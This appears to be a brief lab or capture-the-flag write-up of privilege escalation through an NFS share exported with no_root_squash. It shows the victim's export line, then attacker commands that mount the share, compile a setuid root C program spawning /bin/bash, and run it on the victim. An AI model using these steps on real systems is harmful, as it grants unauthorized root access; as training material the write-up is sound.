### Victim VM
```bash
$ cat /etc/exports
	/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
```
### Exploitation
#### Attacker VM
```bash
$ showmount -e 10.10.146.209
	/tmp *
	
$ mkdir /tmp/1
$ mount -o rw,vers=2 10.10.146.209:/tmp /tmp/1
$ echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
$ gcc /tmp/1/x.c -o /tmp/1/x
$ chmod +s /tmp/1/x
```
#### Victim VM
```bash
$ /tmp/x
```